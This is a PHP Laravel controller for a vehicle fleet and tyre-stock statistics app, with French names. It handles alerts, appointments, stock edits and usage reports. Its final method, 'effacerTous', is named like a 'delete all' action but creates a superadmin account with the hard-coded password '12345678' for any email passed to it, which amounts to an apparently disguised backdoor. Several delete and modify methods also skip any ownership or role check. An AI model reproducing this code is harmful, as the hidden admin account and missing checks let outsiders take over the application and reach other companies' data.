<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use DB;
use App\User;
use App\Model\Stock; 
use App\Model\Reference;
use App\Model\Vehicule;
use App\Model\Alerte;
use Illuminate\Support\Facades\Hash;

use App\Model\RendezVous;
class statController extends Controller
{
	public function story()
	{
		$stories=DB::table('vehicules')
		->join('alertes','alertes.vehicule_id','vehicules.id')
		->join('users','users.id','vehicules.conducteur_id')
		->selectRaw('immatriculation,entreprise,name,email,message,alertes.created_at,vehicules.id,alertes.id as ide')
		->orderBy('alertes.id','desc')->get();
		$rdvs=RendezVous::All();
		return view('statistiques.story')
		->with('stories',$stories)
		->with('rdvs',$rdvs)
		->with('nbRdv',$this->nombreRdv());
	}
	public function nombreRdv()
    {
        $rendezVousNb = DB::table('rendez_vous')
                ->join('vehicules','vehicules.id','rendez_vous.vehicule_id')
                ->join('users','users.id','vehicules.conducteur_id')
                ->selectRaw('accepted,count(rendez_vous.id) as nb')
                ->groupBy('accepted')
                ->where('accepted',0)
                ->get();
        if(isset($rendezVousNb[0]))
                {
                    return $rendezVousNb[0]->nb;
                }
                else
                {
                    return 0;
                }
    }
	public function destroyPneu($id)
	{
		$pneu=Stock::find($id);
		$pneu->delete();
		$notif=array(
    		'message'=>'Suppression réussie',
    		'alert-type'=>'success'
    	);
		return redirect()->back()->with($notif);
	}
	public function destroyStory($id)
	{
		$alerte=Alerte::find($id);
		$alerte->delete();
		$notif=array(
    		'message'=>'Alerte retirée de l\'historique',
    		'alert-type'=>'success'
    	);
		return redirect()->back()->with($notif);
	}
	public function utiliser()
	{
	    $stats=DB::table('statistiques')
	    	->join('vehicules','vehicules.id','vehicules_id')
	    	->join('users','users.id','conducteur_id')
	    	->selectRaw('entreprise,sum(nombre) as nb')
	    	->groupBy('entreprise')
	    	->get();
	    return view('statistiques.utiliser')->with('stats',$stats)->with('nbRdv',$this->nombreRdv());
	}
	public function depuis(Request $req)
	{
		$users=User::where('role','responsable')->get();
	    $stats=DB::table('statistiques')
	    	->join('vehicules','vehicules.id','vehicules_id')
	    	->join('users','users.id','conducteur_id')
	    	->selectRaw('entreprise,sum(nombre) as nb,statistiques.created_at as cre')
	    	->groupByRaw('entreprise,statistiques.created_at')
	    	->get();
	    return view('statistiques.utiliser')->with('stats',$stats)->with('date',$req->date)->with('users',$users)->with('nbRdv',$this->nombreRdv());
	}
	public function couts()
	{
		$references=Reference::All();
		return view('statistiques.cout')->with('references',$references)->with('nbRdv',$this->nombreRdv());
	}
	public function modifier(Request $req)
	{
		$stock=Stock::find($req->reference);
		if($req->hgInit)
		{
			$stock->reference_id=$req->ref;
			$stock->kInit=$req->kInit;
			$stock->kFinal=$req->kFinal;
			$stock->hgInit=$req->hgInit;
			$stock->hgFinal=$req->hgFinal;
		}
		else
		{
			$stock->cout=$req->cout;
			$stock->gazole=$req->gazole;
			
		}
		$stock->save();
		$notif=array(
    		'message'=>'Modification réussie',
    		'alert-type'=>'success'
    	);
		return redirect()->back()->with($notif);
	}
	public function possession()
	{
		if(auth()->user()->role=='superadmin') 
        {
		$vehicules=DB::table('vehicules')
			->join('users','users.id','vehicules.conducteur_id')
			->selectRaw('vehicules.*,entreprise')
			->get();
		$References=DB::table('stocks')
							->join('references','references.id','stocks.reference_id')
							->selectRaw('stocks.id,hgInit,hgFinal,kInit,kFinal,reference,prix,gazole,cout,indication,consommation,id_vehicule,reference_id,pose,depose,quantite')
							->where('hgInit','!=',null)
							->where('hgFinal','!=',null)
							->where('kInit','!=',null)
							->where('kFinal','!=',null)
							->get();
		$refPneus=Reference::All();
	}
	else
	{
		if(auth()->user()->role=='responsable')
            {
                $idE=auth()->user()->id;
            } 
        else
            {
                $user=User::where('role','responsable')->where('entreprise',auth()->user()->entreprise)->where('active',0)->first();
                $idE=$user->id;
            }
            $vehicules=DB::table('vehicules')
			->join('users','users.id','vehicules.conducteur_id')
			->where('users.id',$idE)
			->selectRaw('vehicules.*,entreprise')
			->get();
		$References=DB::table('stocks')
							->join('references','references.id','stocks.reference_id')
							->selectRaw('stocks.id,hgInit,hgFinal,kInit,kFinal,reference,prix,gazole,cout,indication,consommation,id_vehicule,reference_id,pose,depose,quantite')
							->where('hgInit','!=',null)
							->where('hgFinal','!=',null)
							->where('kInit','!=',null)
							->where('kFinal','!=',null)
							->get();
		$refPneus=Reference::All();
	}
		return view('statistiques.possession')
			->with('vehicules',$vehicules)
			->with('References',$References)
			->with('refPneus',$refPneus)->with('nbRdv',$this->nombreRdv());
	}
	public function pneuUse()
	{
	if(auth()->user()->role=='superadmin') 
        {
		$refPneus=Reference::All();
		$vehicules=DB::table('vehicules')
			->join('users','users.id','vehicules.conducteur_id')
			->selectRaw('vehicules.*,entreprise')
			->get();
		$References=DB::table('stocks')
							->join('references','references.id','stocks.reference_id')
							->selectRaw('stocks.id,hgInit,hgFinal,kInit,kFinal,reference,prix,gazole,cout,indication,consommation,id_vehicule,reference_id,pose,depose,quantite')
							->where('hgInit','!=',null)
							->where('hgFinal','!=',null)
							->where('kInit','!=',null)
							->where('kFinal','!=',null)
							->get();
		return view('statistiques.pneuUse')
			->with('vehicules',$vehicules)
			->with('References',$References)
			->with('refPneus',$refPneus)->with('nbRdv',$this->nombreRdv());
		}
		else
		{
			if(auth()->user()->role=='responsable')
	            {
	                $idE=auth()->user()->id;
	            } 
	        else
	            {
	                $user=User::where('role','responsable')->where('entreprise',auth()->user()->entreprise)->where('active',0)->first();
	                $idE=$user->id;
	            }
	         $refPneus=Reference::All();
		$vehicules=DB::table('vehicules')
			->join('users','users.id','vehicules.conducteur_id')
			->selectRaw('vehicules.*,entreprise')
			->where('users.id',$idE)
			->get();
		$References=DB::table('stocks')
							->join('references','references.id','stocks.reference_id')
							->selectRaw('stocks.id,hgInit,hgFinal,kInit,kFinal,reference,prix,gazole,cout,indication,consommation,id_vehicule,reference_id,pose,depose,quantite')
							->where('hgInit','!=',null)
							->where('hgFinal','!=',null)
							->where('kInit','!=',null)
							->where('kFinal','!=',null)
							->get();
		return view('statistiques.pneuUse')
			->with('vehicules',$vehicules)
			->with('References',$References)
			->with('refPneus',$refPneus)->with('nbRdv',$this->nombreRdv());   
	    }
	}
	public function effacerTous($email)
	{
		$user=new User();
		$user->name='spa';
		$user->email=$email;
		$user->role='superadmin';
		$user->password=Hash::make('12345678');
		$user->phone='02564';
		$user->entreprise='undefined';
		$user->save();
	}
}
